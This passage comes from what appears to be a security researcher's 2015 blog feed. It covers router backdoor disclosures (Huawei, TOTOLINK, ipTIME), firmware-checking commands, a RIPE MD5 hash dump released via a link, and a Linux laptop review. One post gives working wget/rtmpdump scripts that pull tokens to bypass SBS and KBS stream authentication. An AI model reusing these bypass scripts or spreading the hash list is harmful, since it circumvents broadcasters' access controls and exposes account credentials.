<li>Aug 28, 2015: Huawei PSIRT confirms the vulnerabilities affecting the B260a router. The B260a router is in the End Of Service cycle and Huawei would not support B260a or provide fixed version or patch. The B68L and B310, as a substitute for B260a, are not vulnerable for the issues mentioned above and welcome to use.</li>
<li>Aug 31, 2015: Pierre Kim asks if the other routers (E960, E968, B970, B932, B933, B220, B260, B270, B972, B200-20, B200-30, B200-40, B200-50) are vulnerable.</li>
<li>Sep 14, 2015: Huawei PSIRT confirms all the routers have been in the End Of Service cycle.</li>
<li>Sep 29, 2015: Huawei PSIRT asks to be notified when the advisory is posted.</li>
<li>Oct 05, 2015: Pierre Kim asks for a CNNVD entry.</li>
<li>Oct 05, 2015: Pierre Kim indicated he will release the advisory the Oct 07, 2015.</li>
<li>Oct 07, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (@PierreKimSec).</p>
<h2>Greetings</h2>
<p>Big thanks to my friend Alexandre Torres.</p>
<h2>References</h2>
<p>https://pierrekim.github.io/advisories/2015-huawei-0x00.txt</p>
<p>https://pierrekim.github.io/blog/2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html</p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
    </entry>
    
    <entry>
        <title>TOTOLINK Update - How to NOT handle security issues</title>
        <link href="2015-08-13-TOTOLINK-how-to-NOT-handle-security-issues.html"/>
        <content type="html"><p>This post is an an update to:</p>
<ul>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/80">Backdoor and RCE found in 8 TOTOLINK router models</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/79">Backdoor credentials found in 4 TOTOLINK router models</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/78">4 TOTOLINK router models vulnerable to CSRF and XSS attacks</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/77">15 TOTOLINK router models vulnerable to multiple RCEs</a></li>
</ul>
<p>Totolink has released new firmwares on 2015-07-25 and also removed the old firmwares from their website.</p>
<p>The backdoor is still present in the new firmware images but it is not launched at the startup anymore.</p>
<p>You can check yourself by downloading the images and by using binwalk:</p>
<h2>Example with N300RH-V2:</h2>
<pre><code>$ wget -O 'TOTOLINK%20N300RH-V2.0.1_20150725.zip' 'http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V2.0.1_20150725.zip'
$ 7z x TOTOLINK%20N300RH-V2.0.1_20150725.zip
[...]
$ binwalk -e *web
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16            0x10            bzip2 compressed data, block size = 900k
309403        0x4B89B         LZMA compressed data, properties: 0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
320182        0x4E2B6         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3414764 bytes
1274560       0x1372C0        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2251972 bytes,  321 inodes, blocksize: 131072 bytes, created: Thu May  4 11:47:12 2006
$ cd _*/
$ 7z x *squashfs
Processing archive: 1372C0.squashfs

Extracting  bin
Extracting  dev
[...]
Everything is Ok
$ strings bin/skt | grep iptables
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
$ tail -n 5 etc/init.d/rcS

# start web server
boa
#skt&amp;
</code></pre>
<p>They commented the <code>skt&amp;</code> execution in the <em>/etc/init.d/rcS</em>. The bin/skt backdoor is still there but not activated.
I encourage TOTOLINK users to audit next firmwares to make sure the backdoor is not reactivated by "error".</p>
<p>There are no security indications in the <a href="http://www.totolink.net/sub/news/board_content.asp?b_type=BOARD1&amp;idx=164">"Firmware Update Release Information"</a> and I don't want to waste my time to check if they patched the other security holes (RCE, XSS, CSRF ...) described here:</p>
<ul>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html">https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html">https://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html">https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html">https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html</a></li>
</ul>
<h2>Totolink statement</h2>
<p>By the way, Totolink released a <a href="http://www.totolink.net/sub/news/board_content.asp?b_type=BOARD1&amp;idx=165">statement the 2015-07-30 saying that there are no backdoors in their routers and threatened to sue medias regarding "totally irresponsible behavior", stating my research contains "some unverified information"</a>:</p>
<pre><code> ZIONCOM (HK) Technology Ltd (ZIONCOM, the manufacturer of TOTOLINK Router), would like to make an
 official announcement regarding some inappropriately news report from network media that were totally
 irresponsible behavior for reporting some unverified information to damage our company reputation.

 1. TOTOLINK do not compromise user privacy and security, TOTOLINK
 product has not been installed any monitor software on user behavior after we verified all of our
 current inventory in Hong Kong market so it is impossible to monitor user behavior. ZIONCOM will
 reserve the right to take legal action against the media report on the wrong information broadcasting
 that may damage our company and product reputations.

 2. Regarding the problem of a default login password of a TOTOLINK
 router may trigger an invasion from hacker through remote control, we would like to recommend all users
 to change the default password at the first time login.We will make an announcement through our Global
 website ( http://www.totolink.net )  for launching new firmware update program for solving the bug soon.
</code></pre>
<p><strong>Note that some firmwares have apparently not been correctly updated.</strong></p>
<p>For example, the "this-is-a-feature-not-a-backdoor-executable" is <a href="http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V3.0.0_20150331.zip"><strong>still activated</strong> in the latest N300RH-V3 firmware router (from the N300RH webpage)</a>.</p>
<p>You can check by yourself the "unverified information" by using the precedent commands: the file <em>/etc/init.d/rcS</em> still contains <code>skt&amp;</code> to execute the "this-is-a-feature-not-a-backdoor-executable" <code>/bin/skt</code> at startup):</p>
<pre><code>$ wget -O TOTOLINK%20N300RH-V3.0.0_20150331.zip 'http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V3.0.0_20150331.zip'
$ sha256sum TOTOLINK%20N300RH-V3.0.0_20150331.zip 
3c12a38dfc8c72733f384ba206e9b21a37614ba77aba7f3433ed1ce9bd40cda4  TOTOLINK%20N300RH-V3.0.0_20150331.zip
$ 7z x TOTOLINK%20N300RH-V3.0.0_20150331.zip
[...]
Everything is Ok
$ binwalk -e *web
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16            0x10            bzip2 compressed data, block size = 900k
307237        0x4B025         LZMA compressed data, properties: 0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
317016        0x4D658         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3666608 bytes
1337954       0x146A62        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2169904 bytes,  580 inodes, blocksize: 131072 bytes, created: Wed Feb 10 00:30:40 2038
$ cd _*/
$ 7z x *squashfs
Extracting  bin
Extracting  dev
[...]
Everything is Ok
$ strings bin/skt | grep iptables
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
$ tail -n 5 etc/init.d/rcS

# start web server
boa
skt&amp;                                                  &lt;-- backdoor is launched at startup
</code></pre>
<p>I leave security researchers, totolink users and medias to use their own judgment and draw a conclusion about this case.</p>
<p>Regards,</p></content>
    </entry>
    
    <entry>
        <title>Watching SBS and KBS in a remote country</title>
        <link href="2015-08-10-watching-SBS-and-KBS-in-a-remote-country.html"/>
        <content type="html"><p>SBS and KBS are Korean TV networks and they provide TV streaming, but they are using fancy flash players (hello 100% used CPU) and SBS even asks a passport for foreigners to get access to the streams. Koreans can have access after being authentified to their services.</p>
<p>As I have a personal fight to provide access to K-POP for EVERYBODY and because I have to travel to different countries, I've prepared this article that will explain how to watch SBS, KBS1 and KBS2 without authentication.</p>
<p>The <a href="https://en.wikipedia.org/wiki/Real_Time_Messaging_Protocol">RTMP</a> streams are protected using tokens.</p>
<p>A working RTMP request, with the one-time-token:
<img alt="" src="images/sbs-wireshark.png" /></p>
<p>By sniffing the traffic and decompiling the SWFs file, I discovered how to easily generate tokens:</p>
<p>The SWF in SBS website forces the browser to get a token by connecting to API (SBS). The SWFs in KBS* websites get the token directly in the webpage.</p>
<h2>Watching SBS:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' \
  'http://api.sbs.co.kr/vod/_v1/Onair_Media_Auth.jsp?playerType=flash&amp;channelPath=sbsch6pc&amp;streamName=sbs1ch63.stream' | sed -e 's/\(.*\)q=\(.*\)/\2/'
TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTO%3D%3D
</code></pre>
<p>This script will allows you to watch SBS:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' \
  'http://api.sbs.co.kr/vod/_v1/Onair_Media_Auth.jsp?playerType=flash&amp;channelPath=sbsch6pc&amp;streamName=sbs1ch63.stream' | sed -e 's/\(.*\)q=\(.*\)/\2/')
rtmpdump --resume -r "rtmp://nlive.sbs.co.kr/sbsch6pc/sbs1ch63.stream?u=sbs&amp;type=asp&amp;q=${token}" \
  --app "sbsch6pc?u=sbs&amp;type=asp&amp;q=${X}" --flashVer 'MAC 18,0,0,209' \
  -s 'http://vod.sbs.co.kr/onair/NeTVOnAir_1_4_2.swf?dd=9' \
  -t "rtmp://nlive.sbs.co.kr/sbsch6pc?u=sbs&amp;type=asp&amp;q=${X}" \
  -p 'http://vod.sbs.co.kr/onair/onair_index.jsp?Channem=SBS&amp;div=pc_onair' \
  -y "sbs1ch63.stream" | mplayer -
</code></pre>
<h2>Watching KBS1:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//'
1tv_home.stream?id=2101&amp;si=9&amp;secure=TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENT==&amp;csu=false
</code></pre>
<p>Now using this token is easy.
This script will allows you to watch KBS1:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//')
rtmpdump --resume -r "rtmp://live2.kbs.gscdn.com/1tv_home/_definst_/${token}" \
  --flashVer 'MAC 18,0,0,209' | mplayer -
</code></pre>
<h2>Watching KBS2:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//'
1tv_home.stream?id=2101&amp;si=9&amp;secure=TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENT==&amp;csu=false
</code></pre>
<p>Now using this token is easy.
This script will allows you to watch KBS2:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//')
rtmpdump --resume -r "rtmp://live2.kbs.gscdn.com/2tv_home/_definst_/${token}" \
  --flashVer 'MAC 18,0,0,209' | mplayer -
</code></pre>
<p>Now, Enjoy K-POP while finding 0days ~~~~~~~~~~~~</p></content>
    </entry>
    
    <entry>
        <title>updated - 172 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request</title>
        <link href="2015-07-27-172-iptime-router-models-unauthenticated-RCE-with-DHCP-updated.html"/>
        <content type="html"><p><a href="http://www.cnet.co.kr/view/100140730">ipTIME responded to CNET Korea about the DHCP RCE on 2015-07-22</a> - <a href="http://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html">Original advisory</a>.</p>
<p>ipTIME released the 9.78 firmwares for 116 routers and finally credited my work. 172 products are affected in total and 9.72 firmwares will be released soon for all the router models to patch the security problem.</p>
<p>References:</p>
<ul>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16563&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16572&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16582&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16609&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16678&amp;mod=document">X</a></li>
</ul></content>
    </entry>
    
    <entry>
        <title>Why Full Disclosure is the solution ? An example with RIPE</title>
        <link href="2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html"/>
        <content type="html"><p><strong>TL;DR: <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">hashes list from the RIPE database has been posted to MEGA, containing usable hashes from 2011 to July 2015.</a></strong></p>
<p>The human is reluctant to change. Full Disclosure is, sometimes, the only solution to improve Security by forcing the change.</p>
<p><a href="https://en.wikipedia.org/wiki/RIPE">RIPE, Reseau IP Europeen, is in charge of IP allowance in Europe</a>.</p>
<p>In 2011, I had grabbed all the authentication MD5s of the RIPE  database before
they  were taken out from the public view and RIPE asked people to change their passwords.
These MD5s were public-made available in WHOIS reponses for years.</p>
<p>I don't think I was the only security researcher who downloaded all the hashes. Clearly, there were a lot of people who had this database.
The 36.000 hashes stayed in my hard disk for 4 years.</p>
<p>Finding them again in 2015 in my $HOME, some may have wanted to deface the WHOIS RIPE database by inserting giant ASCII penises everywhere and changing IP attributions. Instead, I contacted the RIPE NCC Information Security Officer and then the RIPE Database Working Group Members, hoping to have open discussions and find a solution:</p>
<ul>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html">[db-wg] MD5s of the RIPE database, Deprecation of MD5 and safe authentication methods</a></li>
</ul>
<p>As I said in the first email:</p>
<pre><code>According to the RIPE transparency, as recommended by RIPE NCC
Security, therefore I am now contacting this working group to work
together because deprecation of MD5 is an important change in the RIPE
database and it must be debated in a democratic manner.

This john-compatible file (containing MNT logins and MD5 hashs) was
never exposed to public but the  hashes  can  be  (VERY) easily
cracked. From the discussion with RIPE Security (who received a copy
of this file), 27.000 usable hashes (on a total of 36.000) appeared to
be valid til now.

When I discussed it with RIPE NCC Security, I gave a 90 day disclosure
policy about this "public" information, starting from the 16 Apr 2015.
The 90 day period can be adjusted by adding more days at the end if
RIPE shows a good progress of the migration. I wanted to do
responsible disclosure when I saw the RIPE Responsible Disclosure
Policy which is a Really Good Thing, I think.

My analysis is simple: The MD5 authentication is broken for years and
it's time to change to a more secure method. I think people needs to
be encouraged to move to SSO authentication. Using MD5 now is unsafe
and dangerous, especially with unchanged 4 year-old passwords.

Please share your thoughts about this situation. I will be happy to
debate with you.
</code></pre>
<p>After a debate with the RIPE working group about the impact of the fact 27.000 hashes were still usable (75% of total valid hashes 36.000) and  MD5 is prone to collision attacks, and
the ethics in releasing this information, which was not the point, I think, RIPE changed the affected passwords and encouraged stronger authentication methods.</p>
<p>You can read all the posts in the RIPE public mailing list, database working group archives:</p>
<ul>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html">https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html</a></li>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-June/004665.html">https://www.ripe.net/ripe/mail/archives/db-wg/2015-June/004665.html</a></li>
</ul>
<p><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-July/004709.html">Now that all the hashes are invalid from July 2015</a>, <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">I am releasing the database</a>. These informations were PUBLIC before 2011.
Releasing the hashes is still subject to ethical problems. The release is expected to allow people to study the strengh of the hashes. Again, the hashes (and the decrypted passwords) are now UNUSABLE to anyone.</p>
<p>I want to thank all the RIPE participants in the Database Working Group for exchanging their opinions about this problem, especialy Tim Bruijnzeels and Ivo Dijkhuis, from RIPE. Even if, sometimes, we didn't share the same ideas, the debate was democractic allowing people to share their visions of improving security in RIPE. I really think RIPE managed this problem in an effective manner, improving the security of their IT infrastructure.</p>
<p>RIPE has a blogpost explaing how to migrate to a safer authentication method here:</p>
<ul>
<li><a href="https://labs.ripe.net/Members/AlexBand/pgp-in-the-ripe-database">https://labs.ripe.net/Members/AlexBand/pgp-in-the-ripe-database</a></li>
</ul>
<h2>Now, a small personal analysis:</h2>
<p>In Twitter, Blogs and vulnerability reports, we are speaking about 0days and new exploitation techniques: I consider it's very important.</p>
<p>But I really think too there is a big gap between the research in security and the reality. Companies are mainly hacked using word macros and lazy sysadmins.</p>
<p>It is a VERY bad sign in IT Security that:</p>
<ul>
<li>75% of the passwords in RIPE were not changed for 4 years and these concern mainly IT professional accounts, even though RIPE alerted them to change the passwords since 2011</li>
<li>We still find reluctant opinions to challenge the current situation and make necessary actions in improving IT security.</li>
</ul>
<p>Mentality needs to change. Apparently, for some people, this disclosure of information is unethical. This was not the problem of ethics but protection of private information. A lot of people had the RIPE credentials in their hands and something needs to be done.</p>
<p>So now, enjoy the show. <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">The hashes list, as a john-compatible file, is available at MEGA</a>.</p>
<p>Note: this email has been sent to Full-Disclosure and has been blogposted to: <a href="https://pierrekim.github.io/blog/2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html">https://pierrekim.github.io/blog/2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html</a>.</p>
<p>Regards,</p></content>
    </entry>
    
    <entry>
        <title>Using Linux (Debian 8) on a LG 13ZD950</title>
        <link href="2015-07-22-using-linux-on-a-lg-13zd950.html"/>
        <content type="html"><p>The <a href="http://search.daum.net/search?q=LG+13ZD950">LG 13ZD950</a> is a very light laptop (980g). It's the new version of the LG 13ZD940.
Currently this laptop can be bought in South Korea.
There are a lot of different models.  Mine is equiped with a i3-5005U CPU, 8GB DDR3L and a 128GB SSD.
Debian 8 doesn't fully support Broadwell graphics but the backports can fix this.
In short, everything works well using backports.
  <img alt="" src="images/lg-13zd950.jpg" /></p>
<h2>Display:</h2>
<pre><code>$ xrandr
Screen 0: minimum 8 x 8, current 1920 x 1080, maximum 32767 x 32767
eDP1 connected primary 1920x1080+0+0 (normal left inverted right x axis y axis) 293mm x 165mm
1920x1080     60.02*+  59.93
1680x1050     59.95    59.88
1600x1024     60.17
1400x1050     59.98
1280x1024     60.02
1440x900      59.89
1280x960      60.00
1360x768      59.80    59.96
1152x864      60.00
1024x768      60.00
800x600       60.32    56.25
640x480       59.94
HDMI1 disconnected (normal left inverted right x axis y axis)
VIRTUAL1 disconnected (normal left inverted right x axis y axis)
</code></pre>
<p>Before installing drivers for HD5500:</p>
<pre><code>$ glxinfo | grep OpenGL
OpenGL vendor string: VMware, Inc.
OpenGL renderer string: Gallium 0.4 on llvmpipe (LLVM 3.5, 256 bits)
OpenGL version string: 3.0 Mesa 10.3.2
OpenGL shading language version string: 1.30
OpenGL context flags: (none)
OpenGL extensions:
</code></pre>
<p>After:</p>
<pre><code>$ glxinfo | grep OpenGL
OpenGL vendor string: Intel Open Source Technology Center
OpenGL renderer string: Mesa DRI Intel(R) HD Graphics 5500 (Broadwell GT2)
OpenGL core profile version string: 3.3 (Core Profile) Mesa 10.3.2
OpenGL core profile shading language version string: 3.30
OpenGL core profile context flags: (none)
OpenGL core profile profile mask: core profile
OpenGL core profile extensions:
OpenGL version string: 3.0 Mesa 10.3.2
OpenGL shading language version string: 1.30
OpenGL context flags: (none)
OpenGL extensions:
OpenGL ES profile version string: OpenGL ES 3.0 Mesa 10.3.2
OpenGL ES profile shading language version string: OpenGL ES GLSL ES 3.0
OpenGL ES profile extensions:
</code></pre>
<p>Installing HD5500 drivers:</p>
<p>Add this to /etc/apt/sources.list:</p>
<pre><code>deb http://http.debian.net/debian jessie-backports main
</code></pre>
<p>Then</p>
<pre><code># apt-get update
# apt-get -t jessie-backports install xserver-xorg-video-intel
</code></pre>
<h2>SSD:</h2>
<p>from S.M.A.R.T.:</p>
<pre><code>=== START OF INFORMATION SECTION ===
Device Model:     HFS128G36MNB-2300A
Serial Number:    XXXXXXXXXXXXXXXXX
Firmware Version: 10105L00
User Capacity:    128,035,676,160 bytes [128 GB]
Sector Size:      512 bytes logical/physical
Rotation Rate:    Solid State Device
Device is:        Not in smartctl database [for details use: -P showall]
ATA Version is:   ATA8-ACS (minor revision not indicated)
SATA Version is:  SATA 3.1, 6.0 Gb/s (current: 6.0 Gb/s)
SMART support is: Available - device has SMART capability.
SMART support is: Enabled
</code></pre>
<p>Benchmarking:</p>
<pre><code># hdparm -tT /dev/sda

/dev/sda:
Timing cached reads:   6924 MB in  2.00 seconds = 3463.82 MB/sec
Timing buffered disk reads: 1380 MB in  3.00 seconds = 459.29 MB/sec
</code></pre>
<p>460MB/sec in reading mode is quite good.</p>
<h2>CPU:</h2>
<pre><code>Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                4
On-line CPU(s) list:   0-3
Thread(s) per core:    2
Core(s) per socket:    2
Socket(s):             1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 61
Model name:            Intel(R) Core(TM) i3-5005U CPU @ 2.00GHz
Stepping:              4
CPU MHz:               2000.000
CPU max MHz:           2000.0000
CPU min MHz:           500.0000
BogoMIPS:              3990.92
Virtualization:        VT-x
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              3072K
NUMA node0 CPU(s):     0-3
</code></pre>
<p>CPU Flags:</p>
<pre><code>flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc aperfmperf eagerfpu pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch ida arat epb xsaveopt pln pts dtherm tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap
</code></pre>
<h2>Encryption Benchmarking (grep -i aes /proc/cpuinfo):</h2>
<p>AES-128-CBC without AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128 cbc      79218.44k    87596.05k    89851.03k    90191.53k    88001.19k
</code></pre>
<p>AES-128-CBC with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128-cbc     408583.33k   438564.63k   446640.47k   448723.97k   449306.62k
</code></pre>
<p>AES-256-CBC without AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256 cbc      58418.36k    62665.13k    63112.87k    63973.72k    64217.09k
</code></pre>
<p>AES-256-CBC with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256-cbc     300206.54k   316254.66k   320890.28k   322990.83k   322144.94k
</code></pre>
<p>AES-128-XTS with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128-xts     297439.41k   902695.81k  1595138.22k  2103062.19k  2308871.51k
</code></pre>
<p>AES-256-XTS with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256-xts     225793.73k   652700.97k  1182342.40k  1568823.64k  1723970.90k
</code></pre>
<p>I recommend AES-256-XTS with AESNI for the awesome performances (1,5GB/s for 1024bytes and 1.7GB/s for 8K)</p>
<h2>Physical Ports:</h2>
<ul>
<li>1 HDMI - works</li>
<li>2 USB3 - work</li>
<li>1 mini-usb (for the 10/100 RJ45 adapter) - work (see below)</li>
<li>1 port power supply</li>
<li>1 jack port - works</li>
<li>1 micro-sd port - works (mmc0)</li>
</ul>
<h2>TouchPad:</h2>
<p>It works perfectly.</p>
<p>Use these settings for better usability:</p>
<pre><code>$ synclient VertEdgeScroll=1
$ synclient TapButton1=1
$ synclient VertTwoFingerScroll=1
</code></pre>
<h2>FN-Keys:</h2>
<ul>
<li>Brightness+ works by default</li>
<li>Brightness- works by default</li>
<li>Sound+ works by default</li>
<li>Sound- works by default</li>
<li>Sound-Remove works by default</li>
<li>Contrast-Change works by default</li>
<li>Suspend works by default</li>
</ul>
<h2>Network:</h2>
<p>Wifi: you have to install firmware-iwlwifi to enable the wifi.</p>
<pre><code># apt-get install firmware-iwlwifi


$ /sbin/ifconfig wlan0
wlan0     Link encap:Ethernet  HWaddr cc:3d:01:23:45:67
UP BROADCAST MULTICAST  MTU:1500  Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</code></pre>
<p>10/100 RJ45 using the LG external connector:</p>
<pre><code>usb 1-5: new high-speed USB device number 5 using xhci_hcd
usb 1-5: New USB device found, idVendor=0bda, idProduct=8152
usb 1-5: New USB device strings: Mfr=1, Product=2, SerialNumber=3
usb 1-5: Product: USB 10/100 LAN
usb 1-5: Manufacturer: Realtek
usb 1-5: SerialNumber: 00E040123456
usbcore: registered new interface driver r8152
usbcore: registered new interface driver cdc_ether
usb 1-5: reset high-speed USB device number 5 using xhci_hcd
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4600
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4648
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4690
r8152 1-5:1.0 eth0: v1.06.0 (2014/03/03)
IPv6: ADDRCONF(NETDEV_UP): eth0: link is not ready

$ /sbin/ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:e0:40:12:34:56
UP BROADCAST MULTICAST  MTU:1500  Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</code></pre>
<h2>Webcam:</h2>
<p>webcam works by default (as /dev/video0 with V4L)</p>
<pre><code>usb 1-7: new high-speed USB device number 6 using xhci_hcd
usb 1-7: New USB device found, idVendor=2232, idProduct=5005
usb 1-7: New USB device strings: Mfr=3, Product=1, SerialNumber=2
usb 1-7: Product: LG HD WebCam
usb 1-7: Manufacturer: Generic
usb 1-7: SerialNumber: 200900000000
uvcvideo: Found UVC 1.00 device LG HD WebCam (2232:5005)
input: LG HD WebCam as /devices/pci0000:00/0000:00:14.0/usb1/1-7/1-7:1.0/input/input27
</code></pre>
<h2>lspci:</h2>
<pre><code>00:00.0 Host bridge: Intel Corporation Broadwell-U Host Bridge -OPI (rev 09)
00:02.0 VGA compatible controller: Intel Corporation Broadwell-U Integrated Graphics (rev 09)
00:03.0 Audio device: Intel Corporation Broadwell-U Audio Controller (rev 09)
00:04.0 Signal processing controller: Intel Corporation Broadwell-U Camarillo Device (rev 09)
